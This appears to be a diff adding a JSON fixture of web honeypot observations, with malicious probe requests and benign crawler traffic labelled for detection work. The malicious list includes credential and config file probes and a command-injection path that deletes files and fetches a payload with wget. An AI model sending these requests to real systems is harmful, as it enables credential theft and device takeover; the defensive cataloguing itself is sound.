@@ -1,0 +1,21 @@
+{
+  "_comment": "Tanner(Web/HTTPハニーポット)の実観測パターン。malicious_paths=認証情報/設定ファイル探索やWebShell探索（悪性）、benign_paths=クローラ/正常巡回（良性ノイズ）。Tanner は送信元を peer.ip で表す。",
+  "sensor": "tpot-sensor-01",
+  "malicious_paths": [
+    {"method": "GET", "path": "/.env", "user_agent": "python-requests/2.28.0"},
+    {"method": "GET", "path": "/.aws/credentials", "user_agent": "python-requests/2.31.0"},
+    {"method": "GET", "path": "/.git/config", "user_agent": "Go-http-client/1.1"},
+    {"method": "POST", "path": "/boaform/admin/formLogin", "user_agent": "Mozilla/5.0 zgrab/0.x"},
+    {"method": "GET", "path": "/shell?cd+/tmp;rm+-rf+*;wget+http://0.0.0.0/jaws", "user_agent": "Hello, World"},
+    {"method": "GET", "path": "/wp-login.php", "user_agent": "Mozilla/5.0 (compatible)"},
+    {"method": "POST", "path": "/cgi-bin/luci/;stok=/locale", "user_agent": "curl/7.68.0"},
+    {"method": "GET", "path": "/actuator/env", "user_agent": "python-httpx/0.24"}
+  ],
+  "benign_paths": [
+    {"method": "GET", "path": "/", "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
+    {"method": "GET", "path": "/robots.txt", "user_agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
+    {"method": "GET", "path": "/favicon.ico", "user_agent": "Mozilla/5.0 (compatible; Censys/1.0)"},
+    {"method": "GET", "path": "/", "user_agent": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"},
+    {"method": "HEAD", "path": "/", "user_agent": "Expanse, a Palo Alto Networks company"}
+  ]
+}
